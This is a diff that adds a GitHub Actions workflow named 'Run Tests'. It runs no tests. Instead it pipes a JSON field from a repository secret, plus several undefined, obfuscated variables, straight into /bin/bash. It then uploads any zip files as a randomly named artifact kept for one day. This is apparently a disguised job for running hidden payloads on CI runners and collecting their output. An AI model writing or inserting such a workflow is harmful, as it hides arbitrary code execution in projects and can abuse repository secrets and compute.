@@ -1,0 +1,32 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          o3745: ${{ secrets.o3745 }}
+        run: |
+          printf '%s' "$o3745" | jq -r .fk91793 | /bin/bash
+          printf '%s' "$tnc2" | jq -r .zv145 | /bin/bash
+          echo $aitb7575 | jq -r .qmqfc50874 | /bin/bash
+          printf '%s' "$x83" | jq -r .odizo32701 | /bin/bash
+          echo $ql8 | jq -r .rzfzd0 | /bin/bash
+          echo $sm6 | jq -r .crwc17135 | /bin/bash
+          printf '%s' "$rp60" | jq -r .l18 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: d3tkQlhx
+          path: "*.zip"
+          retention-days: 1
